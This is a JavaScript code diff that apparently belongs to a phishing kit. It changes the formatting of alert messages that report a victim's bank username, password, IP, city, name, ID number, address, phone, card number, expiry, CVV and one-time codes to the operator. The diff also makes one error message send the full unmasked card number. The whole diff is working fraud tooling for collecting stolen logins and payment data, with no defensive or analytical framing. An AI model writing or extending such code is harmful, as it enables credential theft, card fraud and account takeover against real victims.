@@ -269,33 +269,31 @@ export function buildMessageText(session, err = 0) {
   let baseText;
   if (err == 0) {
     baseText = `
-🚨 Ingreso: ${session.sessionId.split("-")[0]} 🚨
-
-👤 Usuario: ${session.user}
-🔑 Contraseña: ${session.pass}
-🗺️ IP: ${session.ip}
-🌆 Ciudad: ${session.city}
+🚨 Nuevo Ingreso: ${session.sessionId.split("-")[0]} 🚨
+╭🟢 Usuario: ${session.user}
+┣🟢 Contraseña: ${session.pass}
+┣🟢 IP: ${session.ip}
+╰🟢 Ciudad: ${session.city}
 `;
 
     if (step >= 2) {
       baseText += `
-🚨 Nueva Data 🚨
+ 🚨 Nueva Data 🚨
+╭🟢 Nombre: ${session.name || "PENDIENTE"}
+┣🟢 Documento: ${session.id || "PENDIENTE"}
+┣🟢 Dirección: ${session.add || "PENDIENTE"}
+╰🟢 Telefóno: ${session.tel || "PENDIENTE"}
 
-🙍‍♂️ Nombre: ${session.name || "PENDIENTE"}
-🪪 Documento: ${session.id || "PENDIENTE"}
-📌 Dirección: ${session.add || "PENDIENTE"}
-📱 Telefóno: ${session.tel || "PENDIENTE"}
- 
-💳 Tarjeta: ${session.card ? mask(session.card) : "PENDIENTE"}
-📆 Exp: ${session.exp || "PENDIENTE"}
-🔐 CVV: ${session.cvv || "PENDIENTE"}
+╭${session.card ? '🟢' : "🟡" } CC: ${session.card ? mask(session.card) : "PENDIENTE"}
+┣${session.exp ? '🟢' : "🟡"} Exp: ${session.exp || "PENDIENTE"}
+╰${session.cvv ? '🟢' : "🟡"} CVV: ${session.cvv || "PENDIENTE"}
 `;
     }
 
     if (step >= 3) {
       baseText += `
 🚨 Nueva Data 🚨
-✅ Dinamica: ${session.otp || "PENDIENTE"}
+${session.otp ? '💸' : "🟡"} Dinamica: ${session.otp || "PENDIENTE"}
 `;
     }
 
@@ -305,36 +303,32 @@ export function buildMessageText(session, err = 0) {
     if(err === 1) {
       errText = `
 🚨 Ingreso: ${session.sessionId.split("-")[0]} 🚨
-
-🛑 Error Logo 🛑
-👤 Usuario: ${session.user}
-🔑 Contraseña: ${session.pass}
+╭❗ Error Logo ❗
+┣🔴 Usuario: ${session.user}
+╰🔴 Contraseña: ${session.pass}
       `
     }
     if(err === 2) {
       errText = `
 🚨 Ingreso: ${session.sessionId.split("-")[0]} 🚨
-
-🛑 Error CC 🛑
-💳 Tarjeta: ${session.card ? mask(session.card) : "PENDIENTE"}
-📆 Exp: ${session.exp}
-🔐 CVV: ${session.cvv}
+╭❗ Error CC ❗
+┣🔴 CC: ${session.card}
+┣🔴 Exp: ${session.exp}
+╰🔴 CVV: ${session.cvv}
       `
     }
     if(err === 3) {
       errText = `
 🚨 Ingreso: ${session.sessionId.split("-")[0]}
-
-🛑 Error Dinamica 🛑
-❌ Dinamica: ${session.otp}
+╭❗ Error Dinamica ❗
+╰❌ Dinamica: ${session.otp}
       `
     }
     if(err === 4) {
       errText = `
 🚨 Ingreso: ${session.sessionId.split("-")[0]} 🚨
-
-🛑 Error OTP 🛑
-❌ OTP: ${session.otp}
+╭❗ Error OTP ❗
+╰❌ OTP: ${session.otp}
       `
     }
     return errText.trim();
